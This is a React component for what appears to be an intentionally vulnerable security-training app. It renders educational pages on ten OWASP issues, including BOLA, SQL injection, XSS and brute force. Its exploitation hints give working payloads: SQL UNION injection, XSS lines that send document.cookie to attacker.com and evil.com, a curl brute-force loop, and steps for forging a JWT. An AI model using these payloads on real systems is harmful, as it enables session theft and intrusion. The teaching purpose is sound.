import { useParams, useNavigate } from 'react-router-dom'
import {
    Box,
    Typography,
    Chip,
    Card,
    CardContent,
    Divider,
    IconButton,
    Switch,
    Tooltip,
} from '@mui/material'
import {
    ArrowBack as ArrowBackIcon,
    BugReport as BugReportIcon,
    Shield as ShieldIcon,
    Code as CodeIcon,
    Lightbulb as LightbulbIcon,
} from '@mui/icons-material'
import { useVulnerabilities } from '../hooks/useVulnerabilities'

// Static educational content for each module, keyed by module ID (matches DEFAULT_MODULES ids)
const MODULE_CONTENT = {
    bola: {
        owaspWeb: 'A01:2025 – Broken Access Control',
        owaspApi: 'API1:2023 – Broken Object Level Authorization',
        description:
            'BOLA occurs when an API endpoint accepts a user-controlled object ID (such as an account number in the URL) but never verifies that the requesting user actually owns that object. An attacker who knows or can guess another user\'s ID can read or modify their data without any special privileges.',
        howItWorks:
            'GET /api/accounts/:id returns full account data for any valid numeric ID. No ownership check is performed in vulnerable mode.',
        exploitHints: [
            'Log in and note your own account ID from the URL or API response.',
            'Change the :id path parameter to a different number (e.g., increment by 1).',
            'Observe whether the server returns another user\'s balance and transaction history.',
            'Enumerate IDs 1–20 with curl or a browser to map all accounts.',
        ],
        mitigationHints: [
            'On every request, compare req.user.id against the account\'s owner_id in the database.',
            'Return 403 Forbidden (not 404) when a valid user requests a resource they don\'t own, 404 leaks existence.',
            'Prefer non-sequential UUIDs over integer IDs to make enumeration impractical.',
            'Never trust the client to enforce ownership, the server is the only authority.',
        ],
        payloadExample: 'GET /api/accounts/3  (while your own account ID is 7)',
    },

    privilege_escalation: {
        owaspWeb: 'A01:2025 – Broken Access Control',
        owaspApi: 'API5:2023 – Broken Function Level Authorization',
        description:
            'Privilege escalation happens when admin-only routes or functionality exist on the server but are protected only by the UI hiding a link, not by server-side role enforcement. Any user who knows the endpoint URL can call it directly.',
        howItWorks:
            'In vulnerable mode, /api/admin/users has no role-checking middleware. The server returns admin data to any authenticated request, regardless of role.',
        exploitHints: [
            'Log in as a regular user (not admin) and navigate directly to /admin in the browser.',
            'In vulnerable mode the page loads and the API returns all user data.',
            'Use curl with your regular user\'s JWT: curl -H "Authorization: Bearer <token>" /api/admin/users',
            'Inspect the JWT payload at jwt.io, note your role is "user", not "admin".',
        ],
        mitigationHints: [
            'Add role-checking middleware to every admin route: reject requests where req.user.role !== "admin".',
            'Never rely on the frontend to hide admin UI, a determined user will bypass it.',
            'Return 403 Forbidden for unauthorized role access; do not return 404 (leaks route existence).',
            'Keep an explicit access-control matrix: document which role is required for every endpoint.',
        ],
        payloadExample: 'GET /api/admin/users  with Authorization: Bearer <regular-user-JWT>',
    },

    excessive_data_exposure: {
        owaspWeb: 'A01:2025 – Broken Access Control',
        owaspApi: 'API3:2023 – Broken Object Property Level Authorization',
        description:
            'Excessive data exposure occurs when an API returns full database objects, including sensitive fields the client never displays. Mass assignment compounds this: if POST/PUT bodies are trusted blindly, an attacker can write fields they should never control, like isAdmin.',
        howItWorks:
            'In vulnerable mode, GET /api/account includes internal fields like isAdmin and creditScore. POST /api/users/profile accepts and saves any field in the body, including isAdmin:true.',
        exploitHints: [
            'Call GET /api/account and inspect the full JSON response, look beyond the fields displayed in the UI.',
            'Search the response for fields like isAdmin, creditScore, passwordHash, or internalId.',
            'Send a POST /api/users/profile request with { "isAdmin": true } in the body.',
            'Refresh the page and check whether your role or accessible routes have changed.',
        ],
        mitigationHints: [
            'Use Data Transfer Objects (DTOs), serialize only the specific fields each view needs.',
            'Validate all incoming request bodies against an allowlist schema; reject unknown fields like isAdmin.',
            'Never expose role flags, hashed passwords, or internal IDs in any API response.',
            'Audit every API response: document what fields each consumer actually requires.',
        ],
        payloadExample: 'POST /api/users/profile  { "username": "alice", "isAdmin": true }',
    },

    verbose_errors: {
        owaspWeb: 'A02:2025 – Security Misconfiguration',
        owaspApi: 'API8:2023 – Security Misconfiguration',
        description:
            'When a server returns stack traces, raw SQL queries, or internal file paths in its error responses, attackers receive a detailed map of the system\'s internals, revealing table names, column names, framework versions, and server paths that make targeted attacks far more precise.',
        howItWorks:
            'In vulnerable mode, the Express global error handler passes the raw Error object (including stack and SQL fragments) directly into the JSON response body.',
        exploitHints: [
            'Trigger a server error by sending a malformed request, such as a non-integer account ID.',
            'Inspect the 500 response body for stack traces, file paths, or SQL query fragments.',
            'Use revealed table names and column names to craft more precise SQL injection payloads.',
            'Look for X-Powered-By headers or version strings in the response that hint at known CVEs.',
        ],
        mitigationHints: [
            'The global error handler must return only a generic message ("Something went wrong") and a unique log ID.',
            'Log the full error detail server-side (to a file or logging service), never to the client.',
            'Set NODE_ENV=production to disable Express\'s default verbose error middleware.',
            'Remove the X-Powered-By header and any other framework fingerprinting headers.',
        ],
        payloadExample: 'GET /api/accounts/abc  (non-integer triggers a DB cast error with full trace)',
    },

    weak_password_storage: {
        owaspWeb: 'A07:2025 – Identification and Authentication Failures',
        owaspApi: 'API2:2023 – Broken Authentication',
        description:
            'Storing passwords as plaintext or with weak, unsalted hashes (MD5, SHA-1) means a single database breach exposes every user\'s password, either directly or within seconds via precomputed rainbow tables. A breach that would be contained becomes a full credential dump.',
        howItWorks:
            'In vulnerable mode, registration stores the password as plaintext or an unsalted MD5 hash. In hardened mode, bcrypt with a per-user salt (cost factor ≥ 12) is used instead.',
        exploitHints: [
            'Query the users table directly and inspect the password column.',
            'A 32-character hex string is MD5, paste it into a site like crackstation.net to crack it instantly.',
            'A plaintext password needs no cracking at all.',
            'Compare hash formats: MD5 is 32 hex chars, bcrypt starts with $2b$ and is 60 chars.',
        ],
        mitigationHints: [
            'Always use bcrypt (or Argon2id) with a cost factor of at least 12 for new password storage.',
            'bcrypt automatically generates and stores a unique salt per hash, never reuse salts.',
            'Never store passwords in plaintext or with reversible encryption.',
            'Consider adding a server-side pepper (HMAC with a secret key) as an additional layer.',
        ],
        payloadExample: "SELECT password FROM users WHERE username = 'alice' and compare hash format",
    },

    sql_injection: {
        owaspWeb: 'A05:2025 – Injection',
        owaspApi: 'API8:2023 – Security Misconfiguration',
        description:
            'SQL injection occurs when user input is concatenated directly into a SQL query string. An attacker can break out of the intended query context and read, modify, or delete arbitrary data, or bypass authentication entirely with a single carefully crafted string.',
        howItWorks:
            'The transaction history search endpoint builds its WHERE clause via string concatenation in vulnerable mode: WHERE description LIKE \'%\' + input + \'%\'. Hardened mode uses a parameterized query.',
        exploitHints: [
            "Enter a single quote (') in the search bar, if the query breaks with an error, injection is confirmed.",
            "Try: ' OR '1'='1; if all transactions appear for all users, injection is working.",
            "Use UNION SELECT to pull data from other tables: ' UNION SELECT username, password, null FROM users --",
            "Comment out trailing query conditions with -- or /* */ to neutralize them.",
        ],
        mitigationHints: [
            'Use parameterized queries (prepared statements) for every database query, never concatenate user input.',
            'An ORM like Sequelize or Prisma automatically uses parameterized queries.',
            'Input validation is a secondary layer, not a primary defense, parameterization is the fix.',
            'Use a least-privilege DB account: the app role should not have DROP, CREATE, or GRANT permissions.',
        ],
        payloadExample: "' OR '1'='1",
    },

    xss_stored: {
        owaspWeb: 'A05:2025 – Injection',
        owaspApi: 'API8:2023 – Security Misconfiguration',
        description:
            'Stored XSS occurs when user-supplied input containing a script tag is saved to the database and later rendered without encoding. Every user who views the affected page runs the attacker\'s script in their own browser, silently and without any interaction beyond visiting the page.',
        howItWorks:
            'Transaction memo fields are stored as-is and later rendered with dangerouslySetInnerHTML in vulnerable mode, causing any embedded scripts to execute when the history page loads.',
        exploitHints: [
            'Submit a transfer with the memo: <script>alert("XSS")</script>',
            'Navigate to the Transaction History page, the script executes on load.',
            'For a realistic attack, exfiltrate the session cookie: <script>fetch("https://attacker.com?c="+document.cookie)</script>',
            'Try HTML event handlers without a script tag: <img src=x onerror=alert(1)>',
        ],
        mitigationHints: [
            "Use React's default JSX rendering, it auto-escapes all output. Avoid dangerouslySetInnerHTML.",
            'If rich HTML must be rendered, sanitize it server-side with a library like DOMPurify before storage.',
            'Set a strict Content Security Policy (CSP) header to block inline scripts.',
            'Mark session cookies as HttpOnly so scripts cannot read them even if XSS succeeds.',
        ],
        payloadExample: '<img src=x onerror=alert(document.cookie)>',
    },

    xss_reflected: {
        owaspWeb: 'A05:2025 – Injection',
        owaspApi: 'API8:2023 – Security Misconfiguration',
        description:
            'Reflected XSS injects a script payload via a URL parameter. The application reflects the parameter back into the page without encoding, executing the attacker\'s script in the victim\'s browser the moment they click a crafted link, no account or login required from the attacker\'s side.',
        howItWorks:
            'The History page reads the ?q= URL parameter and reflects it into the DOM using dangerouslySetInnerHTML when displaying "search results." The phishing email button in the panel demonstrates a realistic delivery vector.',
        exploitHints: [
            'Append a script payload to the search URL: /history?q=<script>alert(1)</script>',
            'Use the phishing email button in the vulnerability panel, it demonstrates link-based delivery.',
            'Craft a cookie-stealing URL: /history?q=<script>document.location="https://evil.com?c="+document.cookie</script>',
            'Try URL-encoding to bypass naive filters: /history?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E',
        ],
        mitigationHints: [
            'Never reflect URL parameters directly into the DOM, read them into React state and render with JSX.',
            "React's JSX rendering escapes all values by default; dangerouslySetInnerHTML bypasses this intentionally.",
            'A strict Content Security Policy (CSP) with nonce-based script allowlisting blocks most reflected XSS.',
            'Validate and sanitize query parameters server-side before including them in any API response.',
        ],
        payloadExample: '/history?q=<img src=x onerror=alert(document.cookie)>',
    },

    weak_session_tokens: {
        owaspWeb: 'A04:2025 – Cryptographic Failures',
        owaspApi: 'API2:2023 – Broken Authentication',
        description:
            'Cookies without HttpOnly can be read by JavaScript, enabling theft via XSS. Without Secure, they are sent over plain HTTP. A JWT signed with a trivially weak secret can be forged by anyone who knows the secret. The Session Inspector on the Dashboard lets you observe all of these flags in real time.',
        howItWorks:
            'In vulnerable mode, the JWT is signed with a weak secret (e.g., "secret") and the response cookie lacks HttpOnly, Secure, and SameSite flags. The Session Inspector on the Dashboard displays the live flag state.',
        exploitHints: [
            'Open DevTools → Application → Cookies and check for missing Secure and HttpOnly attributes.',
            'Run document.cookie in the browser console, if the token appears, HttpOnly is absent.',
            'Paste your JWT into jwt.io and inspect the algorithm and payload claims.',
            'With a known weak secret, sign a modified payload with an elevated role claim and replay it.',
        ],
        mitigationHints: [
            'Set HttpOnly=true on all session cookies, JavaScript must never be able to read them.',
            'Set Secure=true so cookies are only transmitted over HTTPS.',
            'Set SameSite=Strict to prevent the cookie from being sent on cross-origin requests.',
            'Use a cryptographically random JWT secret of at least 256 bits.',
            'Set short JWT expiration (15–60 min) and implement refresh token rotation.',
        ],
        payloadExample: 'document.cookie  →  reveals token value if HttpOnly flag is missing',
    },

    brute_force: {
        owaspWeb: 'A07:2025 – Identification and Authentication Failures',
        owaspApi: 'API4:2023 – Unrestricted Resource Consumption',
        description:
            'Without rate limiting or account lockout, the login endpoint accepts unlimited password attempts at machine speed. An automated script can try tens of thousands of passwords per minute against any account, turning a guessable or leaked password into a certain breach.',
        howItWorks:
            'In vulnerable mode, /api/auth/login imposes no rate limit, no lockout, and no delay between failures. Hardened mode adds IP-based rate limiting (express-rate-limit) and an account lockout after 5 consecutive failures.',
        exploitHints: [
            'Use curl in a shell loop to submit rapid-fire login attempts with a wordlist.',
            'A list of the 100 most common passwords cracks most accounts with weak credentials.',
            'Observe that no lockout, CAPTCHA, or delay is applied regardless of failure count.',
            "Try: for i in $(seq 1 50); do curl -s -X POST /api/auth/login -d '{\"username\":\"alice@test.com\",\"password\":\"pass$i\"}'; done",
        ],
        mitigationHints: [
            'Use express-rate-limit to cap login attempts to 5 per IP per 15-minute window.',
            'Lock the account after 5 consecutive failures and require email-based unlock.',
            'Add exponential backoff: each failed attempt increases the delay before the next is accepted.',
            'After 3 failures, require CAPTCHA to block automated scripts.',
            'Log all failed login attempts and alert on suspicious volume from a single IP.',
        ],
        payloadExample:
            "for i in $(seq 1 100); do curl -sX POST /api/auth/login -d '{\"username\":\"target@test.com\",\"password\":\"pass$i\"}'; done",
    },
}

// OWASP category label → color
function OwaspChip({ label }) {
    return (
        <Chip
            label={label}
            size="small"
            sx={{
                bgcolor: 'rgba(108, 92, 231, 0.15)',
                color: 'primary.light',
                fontWeight: 600,
                fontSize: '0.7rem',
                height: 22,
                border: '1px solid rgba(108, 92, 231, 0.3)',
            }}
        />
    )
}

// Numbered list of hints with an icon accent
function HintList({ hints, color }) {
    return (
        <Box sx={{ display: 'flex', flexDirection: 'column', gap: 1 }}>
            {hints.map((hint, idx) => (
                <Box key={idx} sx={{ display: 'flex', gap: 1.5, alignItems: 'flex-start' }}>
                    <Box
                        sx={{
                            minWidth: 22,
                            height: 22,
                            borderRadius: '50%',
                            bgcolor: color === 'error'
                                ? 'rgba(231, 76, 60, 0.15)'
                                : 'rgba(39, 174, 96, 0.15)',
                            color: color === 'error' ? 'error.main' : 'success.main',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            fontSize: '0.65rem',
                            fontWeight: 700,
                            flexShrink: 0,
                            mt: '1px',
                        }}
                    >
                        {idx + 1}
                    </Box>
                    <Typography variant="body2" sx={{ color: 'text.secondary', lineHeight: 1.6 }}>
                        {hint}
                    </Typography>
                </Box>
            ))}
        </Box>
    )
}

export default function ModulePage() {
    const { moduleId } = useParams()
    const navigate = useNavigate()
    const { modules, toggleModule } = useVulnerabilities()

    const mod = modules.find((m) => m.id === moduleId)
    const content = MODULE_CONTENT[moduleId]

    // Unknown module, surface a minimal error rather than crashing
    if (!mod || !content) {
        return (
            <Box sx={{ p: 4 }}>
                <IconButton onClick={() => navigate(-1)} sx={{ mb: 2 }}>
                    <ArrowBackIcon />
                </IconButton>
                <Typography variant="h3">Module not found</Typography>
                <Typography variant="body2" sx={{ color: 'text.secondary', mt: 1 }}>
                    No module with ID "{moduleId}" exists.
                </Typography>
            </Box>
        )
    }

    return (
        <Box sx={{ maxWidth: 760, mx: 'auto' }}>

            {/* Back navigation */}
            <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 3 }}>
                <Tooltip title="Back">
                    <IconButton
                        onClick={() => navigate(-1)}
                        size="small"
                        sx={{ color: 'text.secondary', '&:hover': { color: 'text.primary' } }}
                    >
                        <ArrowBackIcon fontSize="small" />
                    </IconButton>
                </Tooltip>
                <Typography variant="caption" sx={{ color: 'text.secondary' }}>
                    Vulnerability Modules
                </Typography>
            </Box>

            {/* Header */}
            <Box
                sx={{
                    p: 3,
                    mb: 2.5,
                    borderRadius: 2,
                    border: '1px solid',
                    borderColor: mod.enabled ? 'rgba(231, 76, 60, 0.25)' : 'divider',
                    bgcolor: mod.enabled ? 'rgba(231, 76, 60, 0.04)' : 'surface.card',
                }}
            >
                <Box sx={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', gap: 2, flexWrap: 'wrap' }}>
                    <Box>
                        <Typography variant="h3" sx={{ mb: 1.5 }}>
                            {mod.name}
                        </Typography>
                        <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap' }}>
                            <OwaspChip label={content.owaspWeb} />
                            {content.owaspApi && <OwaspChip label={content.owaspApi} />}
                        </Box>
                    </Box>

                    {/* Toggle */}
                    <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, flexShrink: 0 }}>
                        <Chip
                            label={mod.enabled ? 'Vulnerable' : 'Hardened'}
                            size="small"
                            sx={{
                                bgcolor: mod.enabled ? 'rgba(231,76,60,0.12)' : 'rgba(39,174,96,0.12)',
                                color: mod.enabled ? 'error.main' : 'success.main',
                                fontWeight: 700,
                                fontSize: '0.625rem',
                                textTransform: 'uppercase',
                                letterSpacing: '0.06em',
                                height: 22,
                            }}
                        />
                        <Switch
                            checked={mod.enabled}
                            onChange={() => toggleModule(mod.id)}
                            size="small"
                        />
                    </Box>
                </Box>
            </Box>

            {/* Description */}
            <Card sx={{ mb: 2 }}>
                <CardContent sx={{ p: 2.5 }}>
                    <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 1.5 }}>
                        <ShieldIcon sx={{ fontSize: 16, color: 'primary.main' }} />
                        <Typography variant="caption" sx={{ fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: 'text.secondary' }}>
                            What is this vulnerability?
                        </Typography>
                    </Box>
                    <Typography variant="body1" sx={{ color: 'text.secondary', lineHeight: 1.7 }}>
                        {content.description}
                    </Typography>
                </CardContent>
            </Card>

            {/* How it works in this app */}
            <Card sx={{ mb: 2 }}>
                <CardContent sx={{ p: 2.5 }}>
                    <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 1.5 }}>
                        <CodeIcon sx={{ fontSize: 16, color: 'secondary.main' }} />
                        <Typography variant="caption" sx={{ fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: 'text.secondary' }}>
                            How it works in this app
                        </Typography>
                    </Box>
                    <Typography variant="body2" sx={{ color: 'text.secondary', lineHeight: 1.7, mb: 2 }}>
                        {content.howItWorks}
                    </Typography>

                    <Divider sx={{ mb: 2 }} />

                    <Typography variant="caption" sx={{ fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: 'text.secondary', display: 'block', mb: 1 }}>
                        Example payload
                    </Typography>
                    <Box
                        sx={{
                            px: 2,
                            py: 1.5,
                            borderRadius: 1.5,
                            bgcolor: 'rgba(0,0,0,0.35)',
                            border: '1px solid rgba(255,255,255,0.06)',
                            fontFamily: "'JetBrains Mono', 'Fira Code', monospace",
                            fontSize: '0.8rem',
                            color: 'warning.light',
                            whiteSpace: 'pre-wrap',
                            wordBreak: 'break-all',
                        }}
                    >
                        {content.payloadExample}
                    </Box>
                </CardContent>
            </Card>

            {/* Exploit + Mitigation side-by-side on wider screens, stacked on narrow */}
            <Box sx={{ display: 'grid', gridTemplateColumns: { xs: '1fr', sm: '1fr 1fr' }, gap: 2 }}>

                {/* Exploit Hints */}
                <Card>
                    <CardContent sx={{ p: 2.5 }}>
                        <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 2 }}>
                            <BugReportIcon sx={{ fontSize: 16, color: 'error.main' }} />
                            <Typography variant="caption" sx={{ fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: 'error.main' }}>
                                Exploitation hints
                            </Typography>
                        </Box>
                        <HintList hints={content.exploitHints} color="error" />
                    </CardContent>
                </Card>

                {/* Mitigation Hints */}
                <Card>
                    <CardContent sx={{ p: 2.5 }}>
                        <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 2 }}>
                            <LightbulbIcon sx={{ fontSize: 16, color: 'success.main' }} />
                            <Typography variant="caption" sx={{ fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: 'success.main' }}>
                                Mitigation hints
                            </Typography>
                        </Box>
                        <HintList hints={content.mitigationHints} color="success" />
                    </CardContent>
                </Card>
            </Box>

        </Box>
    )
}
